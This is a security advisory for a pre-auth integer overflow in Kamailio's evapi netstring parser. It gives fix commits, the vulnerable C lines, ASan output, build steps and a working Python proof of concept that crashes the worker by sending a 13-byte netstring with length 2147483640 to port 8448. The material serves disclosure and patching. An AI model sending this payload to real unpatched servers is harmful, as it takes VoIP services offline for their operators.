# evapi: Pre-auth integer overflow in netstring parser

**Module**: evapi
**Severity**: High (pre-auth, crash/DoS via OOB read, potential code execution)
**Tested against**: kamailio commit `7c2d6bffa348` (2026-04-21)
**Fixed in**: [`ab2115d286`](https://github.com/kamailio/kamailio/commit/ab2115d286b48cbd784d332d9208603f68cf2741) ("evapi: check frame length with CLIENT_BUFFER_SIZE")
**Committed**: 2026-08-25 09:25:33 +02:00
**Stable backports**: Kamailio 6.1 [`0d09797907`](https://github.com/kamailio/kamailio/commit/0d09797907b957f42767b18a8190edef9f4c3c70) and Kamailio 6.0 [`10d12da657`](https://github.com/kamailio/kamailio/commit/10d12da657cf284813c6c1833db643aa97c90eb3), both committed 2026-09-15

---

## Fix

The complete fix caps decimal netstring length accumulation at `CLIENT_BUFFER_SIZE`, rather than `INT_MAX`, and adds a direct pointer-range check ensuring that `frame.s + frame.len` remains inside the client's receive buffer before the parser reads the trailing comma. Invalid frames reset the receive position and return without indexing the buffer.

An earlier hardening commit, [`3fc061dfa3`](https://github.com/kamailio/kamailio/commit/3fc061dfa3a0db26591164af88abb6ce31afc61a), was committed on 2026-05-04 and checked whether decimal accumulation itself would exceed `INT_MAX`. It did not reject the report's `2147483640` length, which is below `INT_MAX` but overflows when the parser later adds its position and indexes the fixed receive buffer. For that reason, `ab2115d286` is the complete fix for the reported path.

The evapi module's netstring parser accumulates attacker-supplied digit characters into a signed 32-bit integer without overflow checking. By sending a 13-byte TCP payload with a crafted length prefix, the `frame.len` variable overflows `INT_MAX` and wraps negative. This bypasses the bounds check at line 661, causing a read at an attacker-influenced offset ~2GB past the allocated buffer and crashing the worker process.

The evapi socket (default port 8448) requires no authentication. Any network client that can reach the port triggers the vulnerability.

## Vulnerable code

```c
// evapi_dispatch.c:638-639 — evapi_recv_client()
frame.len = frame.len * 10 + _evapi_clients[i].rbuffer[k] - '0';
```

The parser reads digit characters from the TCP stream and builds a length value via repeated `frame.len = frame.len * 10 + digit`. No upper bound is enforced on `frame.len` before it is used as an array index. With 10 digits (e.g., `2147483640`), the multiplication overflows the signed int, producing a negative value or a value close to `INT_MAX`.

The subsequent bounds check:
```c
// evapi_dispatch.c:661
if(frame.len + k >= _evapi_clients[i].rpos) { ... }
```

When `frame.len` is large enough that `frame.len + k` overflows `INT_MAX`, the result wraps negative and the check passes. The read at line 684 then accesses memory far past the buffer:
```c
// evapi_dispatch.c:684
frame.s[frame.len]  // frame.len ~ 2147483640 → ~2GB past buffer
```

## Call chain

```
evapi_run_dispatcher()
  → evapi_dispatch_data()
    → evapi_recv_client()   ← integer overflow + OOB read
```

## PoC

```python
#!/usr/bin/env python3
"""
Kamailio evapi module - netstring parser integer overflow.

Sends a netstring with length 2147483640 which, when added to the parse
index k at line 661, overflows INT_MAX and wraps negative, bypassing the
bounds check. frame.s[2147483640] at line 684 reads ~2GB past the buffer.

Requires: evapi.so loaded with netstring_format=1
ASAN confirmed: commit 7c2d6bffa348
"""
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8448

# 2147483640 + k (where k ~ 12) overflows INT_MAX (2147483647)
OVERFLOW_LEN = "2147483640"
payload = f"{OVERFLOW_LEN}:A,".encode()

print(f"[*] Connecting to {TARGET}:{PORT}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    s.connect((TARGET, PORT))
except Exception as e:
    print(f"[-] Connect failed: {e}")
    sys.exit(1)

print(f"[*] Sending netstring with len={OVERFLOW_LEN} ({len(payload)} bytes)")
s.send(payload)

import time
time.sleep(1)
print(f"[*] Done -- check ASAN logs")
s.close()
```

## ASan output

```
=================================================================
==14==ERROR: AddressSanitizer: SEGV on unknown address 0x20100dd7564a
    (pc 0xfffff734c418 bp 0xffffffffc900 sp 0xffffffffc1e0 T0)
==14==The signal is caused by a READ memory access.
    #0 0xfffff734c418 in evapi_recv_client /usr/src/kamailio/build/src/modules/evapi/evapi_dispatch.c:684:7
    #1 0xfffff7349fa4 in evapi_dispatch_data /usr/src/kamailio/build/src/modules/evapi/evapi_dispatch.c:830:5
    #2 0xfffff7347e64 in evapi_run_dispatcher /usr/src/kamailio/build/src/modules/evapi/evapi_dispatch.c:892:4
    #3 0xfffff73434bc in evapi_child_proc /usr/src/kamailio/build/src/modules/evapi/evapi_dispatch.c:947:2
    #4 0xfffff7345448 in evapi_run_worker /usr/src/kamailio/build/src/modules/evapi/evapi_dispatch.c:1029:2

SUMMARY: AddressSanitizer: SEGV /usr/src/kamailio/build/src/modules/evapi/evapi_dispatch.c:684:7 in evapi_recv_client
==14==ABORTING
```

## Build & reproduce

```bash
git clone https://github.com/kamailio/kamailio.git
cd kamailio && git checkout 7c2d6bffa348

mkdir build && cd build
CC=clang cmake .. \
    -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -O1 -g" \
    -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
    -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address"
make -j$(nproc) && make install

# kamailio.cfg must load evapi and set:
#   loadmodule "evapi.so"
#   modparam("evapi", "netstring_format", 1)

ASAN_OPTIONS="detect_leaks=0:halt_on_error=0:log_path=/tmp/asan" \
    kamailio -DD -E -f kamailio.cfg

python3 poc.py 127.0.0.1 8448
cat /tmp/asan.*
```
